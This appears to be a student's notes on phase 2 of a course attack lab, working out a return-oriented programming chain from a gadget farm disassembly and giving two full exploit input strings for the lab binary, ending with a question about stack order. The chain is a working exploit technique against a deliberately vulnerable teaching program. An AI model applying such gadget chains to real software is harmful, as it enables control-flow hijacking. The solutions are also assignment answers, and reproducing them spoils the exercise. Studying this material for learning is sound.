RTARGET read strings using the function getbuf()
input is 40 byte.

This is the code of phase2 that i want to costruct from gadget farm using only movq, popq, ret, nop instructions
  - set your cookie on %rdi     -> movq $0x59b997fa,%rdi
  - transfer control to touch2  -> push $0x4017ec     
  -                             -> ret

Steps
 - include the cookie to be pushed on stack
 - pop the value of cookie into %rdi
 - include the address of touch2 to be pushed on stack 
 - ret
 
we will use two gadgets.  
we can search about these in gadget farm between start_farm , mid_farm . 
  
 popq %rdi     5f             
 ret           c3
 
 But when you search about 5f you do not find it in farm.d
 <<
 0000000000401994 <start_farm>:
  401994:	b8 01 00 00 00       	mov    $0x1,%eax
  401999:	c3                   	retq   

000000000040199a <getval_142>:
  40199a:	b8 fb 78 90 90       	mov    $0x909078fb,%eax
  40199f:	c3                   	retq   

00000000004019a0 <addval_273>:
  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
  4019a6:	c3                   	retq   

00000000004019a7 <addval_219>:
  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
  4019ad:	c3                   	retq   

00000000004019ae <setval_237>:
  4019ae:	c7 07 48 89 c7 c7    	movl   $0xc7c78948,(%rdi)
  4019b4:	c3                   	retq   

00000000004019b5 <setval_424>:
  4019b5:	c7 07 54 c2 58 92    	movl   $0x9258c254,(%rdi)
  4019bb:	c3                   	retq   

00000000004019bc <setval_470>:
  4019bc:	c7 07 63 48 8d c7    	movl   $0xc78d4863,(%rdi)
  4019c2:	c3                   	retq   

00000000004019c3 <setval_426>:
  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
  4019c9:	c3                   	retq   

00000000004019ca <getval_280>:
  4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax
  4019cf:	c3                   	retq   

00000000004019d0 <mid_farm>:
  4019d0:	b8 01 00 00 00       	mov    $0x1,%eax
  4019d5:	c3                   	retq   
  >>

but you find 
 1- <pop %rax >   58               in   58 90 c3 <pop %rax ; nop ; ret >
     at address 0x4019ab   or  0x4019cc
 
 2- <movq %rax , %rdi >  48 89 c7  in   48 89 c7 90 c3 <movq %rax,%rdi; nop; ret >
     at address 0x4019c5  or  0x4019a2.
  
Address of touch2 is  0x4017ec 


sol1
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
ab 19 40 00 00 00 00 00                         /*  address of gadget1 */
fa 97 b9 59 00 00 00 00                         /*  cookie  */
c5 19 40 00 00 00 00 00                         /*  address of gadget2 */
ec 17 40 00 00 00 00 00                         /*  address of touch2 */
0a

sol2
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
cc 19 40 00 00 00 00 00                         /*  address of gadget1 */
fa 97 b9 59 00 00 00 00                         /*  cookie  */
a2 19 40 00 00 00 00 00                         /*  address of gadget2 */
ec 17 40 00 00 00 00 00                         /*  address of touch2 */
0a

question : why we put cookie after address of gadget1?
as the steps as i know is 
 - the address of rsp will be loaded in pc and rsp will be incremented by 8
 - so the value of cookie is in current rsp and the cpu will excute the instruction inside the address on pc
 - so it will pop the value of stack (cookie) and load it into %rdi.




                     
